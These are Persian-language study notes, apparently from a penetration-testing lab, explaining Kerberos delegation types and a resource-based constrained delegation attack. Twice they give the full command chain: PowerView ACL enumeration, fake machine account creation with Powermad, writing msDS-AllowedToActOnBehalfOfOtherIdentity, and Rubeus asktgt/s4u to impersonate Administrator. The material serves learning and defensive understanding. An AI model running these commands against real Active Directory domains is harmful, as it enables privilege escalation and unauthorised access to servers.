

# **Resource-Based Constrained Delegation (RBCD)**

این نوع delegation **برعکس** Constrained Delegation معمولی کار می‌کنه.

---

## **تفاوت اصلی:**

| **Constrained Delegation**              | **RBCD**                                                |
| --------------------------------------- | ------------------------------------------------------- |
| کنترل روی **سرویس مبدأ** (frontend)     | کنترل روی **سرویس مقصد** (backend)                      |
| `msDS-AllowedToDelegateTo` روی frontend | `msDS-AllowedToActOnBehalfOfOtherIdentity` روی backend  |
| ادمین باید frontend رو پیکربندی کنه     | ادمین backend مشخص می‌کنه چه کسی می‌تونه delegation کنه |

# **`msDS-AllowedToActOnBehalfOfOtherIdentity`**

این یک **attribute** در Active Directory هست که مشخص می‌کنه:

**«چه کسانی (کدوم کامپیوترها/سرویس‌ها) مجازند به نمایندگی از کاربران دیگه به این resource دسترسی پیدا کنن؟»**

---

## **ترجمه ساده:**

msDS-AllowedToActOnBehalfOfOtherIdentity


یعنی:

**«اجازه داده شده برای عمل کردن به نمایندگی از هویت‌های دیگر»**

---

## **مثال واقعی:**

فرض کن یک **فایل‌سرور** داری به اسم `FILESERVER01`.

تو می‌خوای بگی:

«فقط `WEBSERVER01` مجاز است به نمایندگی از کاربران به این فایل‌سرور دسترسی پیدا کنه.»

پس روی `FILESERVER01` این attribute رو set می‌کنی:

msDS-AllowedToActOnBehalfOfOtherIdentity = [SID of WEBSERVER01]


---

## **چطور کار می‌کنه؟**

وقتی `WEBSERVER01` می‌خواد به نمایندگی از یوزر `Alice` به `FILESERVER01` وصل بشه:

1. `WEBSERVER01` از KDC می‌خواد: «یه تیکت برای `FILESERVER01` به نام `Alice` بده»
2. KDC چک می‌کنه: «آیا `WEBSERVER01` در لیست `msDS-AllowedToActOnBehalfOfOtherIdentity` فایل‌سرور هست؟»
3. اگر **بله** → تیکت صادر می‌شه
4. اگر **نه** → رد می‌شه

---

## **فرمت ذخیره‌سازی:**

این attribute یک **Security Descriptor** هست که شامل **SID** کامپیوترهای مجاز می‌شه.

مثال:

O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...)


این یعنی: کامپیوتری با SID مشخص‌شده مجاز به delegation هست.

---

## **تفاوت با Constrained Delegation:**

| **Constrained Delegation** | **RBCD** |
|----------------------------|----------|
| Attribute روی **سرویس مبدأ** (frontend) | Attribute روی **سرویس مقصد** (backend) |
| `msDS-AllowedToDelegateTo` | `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| Frontend می‌گه: «من به این سرویس‌ها delegation می‌کنم» | Backend می‌گه: «این سرویس‌ها می‌تونن به من delegation کنن» |

---

## **چرا خطرناکه؟**

اگر مهاجم بتونه این attribute رو تغییر بده (با **GenericAll** یا **GenericWrite**):

1. یک کامپیوتر جعلی می‌سازه
2. SID کامپیوتر جعلی رو به `msDS-AllowedToActOnBehalfOfOtherIdentity` اضافه می‌کنه
3. حالا می‌تونه به نمایندگی از **هر کاربری** (حتی Domain Admin) به اون resource دسترسی پیدا کنه

---

## **مفهوم:**

سرویس **مقصد** (مثلاً یک فایل‌سرور) مشخص می‌کنه:

«چه کامپیوترهایی مجاز هستند به نمایندگی از کاربران به من دسترسی پیدا کنند؟»

این لیست در attribute زیر ذخیره می‌شه:

msDS-AllowedToActOnBehalfOfOtherIdentity


---

## **1️⃣ پیدا کردن اهداف آسیب‌پذیر:**

```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll" -and 
    $_.SecurityIdentifier -match "S-1-5-21-.*"
}
```

**هدف:** پیدا کردن کامپیوترهایی که ما روی اون‌ها **GenericAll** یا **GenericWrite** داریم.

چرا؟ چون می‌تونیم attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` رو تغییر بدیم.


![[Pasted image 20260501004410.png]]


---

## **2️⃣ مراحل حمله:**

### **مرحله 1: ساخت یک کامپیوتر جعلی**

```powershell
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**نتیجه:** یک کامپیوتر جعلی به نام `FAKE01$` در AD ساخته می‌شه.

**چرا؟** چون برای RBCD نیاز داریم یک کامپیوتر کنترل‌شده داشته باشیم که بتونیم delegation رو ازش انجام بدیم.

---

### **مرحله 2: تنظیم RBCD روی کامپیوتر هدف**

```powershell
$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer TARGET01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**معنی:** به کامپیوتر `TARGET01` می‌گیم:

«کامپیوتر `FAKE01$` مجاز است به نمایندگی از هر کاربری به من دسترسی پیدا کنه.»

---

### **مرحله 3: گرفتن TGT برای کامپیوتر جعلی**

```powershell
.\Rubeus.exe asktgt /user:FAKE01$ /rc4:[NTLM_HASH_OF_FAKE01] /domain:prod.corp1.com /nowrap
```

یا اگر پسورد داری:

```powershell
.\Rubeus.exe asktgt /user:FAKE01$ /password:P@ssw0rd! /domain:prod.corp1.com /nowrap
```

**نتیجه:** یک TGT برای `FAKE01$` می‌گیری.

---

### **مرحله 4: S4U attack برای impersonate کردن Administrator**

```powershell
.\Rubeus.exe s4u /ticket:[BASE64_TGT] /impersonateuser:Administrator /msdsspn:cifs/TARGET01.prod.corp1.com /ptt
```

**جریان:**

1. **S4U2Self:** `FAKE01$` یک تیکت برای خودش به نام `Administrator` می‌گیره
2. **S4U2Proxy:** `FAKE01$` یک تیکت برای `cifs/TARGET01` به نام `Administrator` می‌گیره
3. **`/ptt`:** تیکت inject می‌شه

**نتیجه:** حالا با هویت `Administrator` به `TARGET01` دسترسی داری.

---

## **3️⃣ تست دسترسی:**

```powershell
ls \\TARGET01.prod.corp1.com\c$
```

اگر موفق بود، لیست فایل‌های `C:\` رو می‌بینی.

---

## **خلاصه حمله RBCD:**

1. پیدا کردن کامپیوتری که روش **GenericAll/GenericWrite** داری
2. ساخت یک کامپیوتر جعلی (`New-MachineAccount`)
3. تنظیم `msDS-AllowedToActOnBehalfOfOtherIdentity` روی کامپیوتر هدف
4. گرفتن TGT برای کامپیوتر جعلی
5. استفاده از S4U برای impersonate کردن یوزر ممتاز (مثلاً Administrator)
6. دسترسی به کامپیوتر هدف با هویت یوزر ممتاز

---


# **مبدأ و مقصد در Kerberos Delegation**

بیا با یک **مثال واقعی** شروع کنیم:

---

## **سناریو:**

یک کاربر به اسم **Alice** می‌خواد به یک **وب‌سایت** (`WEBSERVER01`) وصل بشه.

وب‌سایت برای نمایش اطلاعات Alice باید به یک **دیتابیس** (`DBSERVER01`) دسترسی پیدا کنه.

Alice  →  WEBSERVER01  →  DBSERVER01
(کاربر)   (Frontend)      (Backend)


---

## **تعریف مبدأ و مقصد:**

| **نقش** | **توضیح** | **مثال** |
|---------|-----------|----------|
| **مبدأ (Source/Frontend)** | سرویسی که **کاربر مستقیماً بهش وصل می‌شه** | `WEBSERVER01` |
| **مقصد (Target/Backend)** | سرویسی که **Frontend باید به نمایندگی از کاربر بهش وصل بشه** | `DBSERVER01` |

---

## **جریان کار:**

1. Alice → WEBSERVER01 (احراز هویت)
2. WEBSERVER01 → DBSERVER01 (به نمایندگی از Alice)


**WEBSERVER01** باید بتونه **به جای Alice** به دیتابیس دسترسی پیدا کنه.

این کار با **Kerberos Delegation** انجام می‌شه.

---

# **انواع Delegation و تفاوت مبدأ/مقصد**

---

## **1. Unconstrained Delegation**

### **کنترل کجاست؟**
روی **مبدأ** (`WEBSERVER01`)

### **چطور کار می‌کنه؟**
- وقتی Alice به `WEBSERVER01` وصل می‌شه، **TGT خودش رو هم می‌فرسته**
- `WEBSERVER01` این TGT رو **ذخیره می‌کنه**
- حالا `WEBSERVER01` می‌تونه با TGT آلیس به **هر سرویسی** (حتی `DBSERVER01`) وصل بشه

### **Attribute:**
WEBSERVER01 → TRUSTED_FOR_DELEGATION = True


### **خطر:**
مهاجم اگه `WEBSERVER01` رو compromise کنه، TGT همه کاربرانی که وصل شدن رو می‌دزده.

---

## **2. Constrained Delegation**

### **کنترل کجاست؟**
روی **مبدأ** (`WEBSERVER01`)

### **چطور کار می‌کنه؟**
- `WEBSERVER01` فقط مجازه به **سرویس‌های مشخص‌شده** delegation کنه
- این لیست در attribute زیر ذخیره می‌شه:

WEBSERVER01 → msDS-AllowedToDelegateTo = ["MSSQLSvc/DBSERVER01.prod.corp1.com"]


### **معنی:**
«`WEBSERVER01` فقط مجازه به `DBSERVER01` (سرویس SQL) delegation کنه، نه جای دیگه»

### **مثال:**
```powershell
Get-DomainComputer WEBSERVER01 | select msds-allowedtodelegateto
```

خروجی:
msds-allowedtodelegateto
------------------------
MSSQLSvc/DBSERVER01.prod.corp1.com


---

## **3. Resource-Based Constrained Delegation (RBCD)**

### **کنترل کجاست؟**
روی **مقصد** (`DBSERVER01`) ← **این تفاوت اصلیه!**

### **چطور کار می‌کنه؟**
- `DBSERVER01` خودش مشخص می‌کنه چه کسی مجازه بهش delegation کنه
- این لیست در attribute زیر ذخیره می‌شه:

DBSERVER01 → msDS-AllowedToActOnBehalfOfOtherIdentity = [SID of WEBSERVER01]


### **معنی:**
«فقط `WEBSERVER01` مجازه به نمایندگی از کاربران به من (`DBSERVER01`) دسترسی پیدا کنه»

---

# **مقایسه مبدأ/مقصد**

| **نوع Delegation** | **Attribute کجاست؟** | **چه کسی تصمیم می‌گیره؟** |
|--------------------|----------------------|---------------------------|
| **Unconstrained** | روی **مبدأ** (WEBSERVER01) | مبدأ می‌گه: «من به همه جا delegation می‌کنم» |
| **Constrained** | روی **مبدأ** (WEBSERVER01) | مبدأ می‌گه: «من فقط به DBSERVER01 delegation می‌کنم» |
| **RBCD** | روی **مقصد** (DBSERVER01) | مقصد می‌گه: «فقط WEBSERVER01 می‌تونه به من delegation کنه» |

---

# **مثال عملی RBCD**

فرض کن مهاجم روی `DBSERVER01` دسترسی **GenericWrite** داره.

### **مراحل حمله:**

#### **1. ساخت کامپیوتر جعلی:**
```powershell
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

#### **2. تنظیم RBCD روی مقصد:**
```powershell
$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DBSERVER01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**معنی:** به `DBSERVER01` گفتیم: «`FAKE01$` مجازه به نمایندگی از کاربران به تو دسترسی پیدا کنه»

#### **3. گرفتن TGT برای FAKE01:**
```powershell
.\Rubeus.exe asktgt /user:FAKE01$ /password:P@ssw0rd! /domain:prod.corp1.com /nowrap
```

#### **4. S4U attack:**
```powershell
.\Rubeus.exe s4u /ticket:[BASE64_TGT] /impersonateuser:Administrator /msdsspn:cifs/DBSERVER01.prod.corp1.com /ptt
```

#### **5. تست:**
```powershell
ls \\DBSERVER01.prod.corp1.com\c$
```

---

# **خلاصه:**

- **Unconstrained/Constrained:** مبدأ (Frontend) کنترل می‌کنه به کجا delegation می‌کنه
- **RBCD:** مقصد (Backend) کنترل می‌کنه چه کسی می‌تونه بهش delegation کنه

**تفاوت اصلی:** جهت کنترل معکوس شده—در RBCD، مقصد تصمیم می‌گیره، نه مبدأ.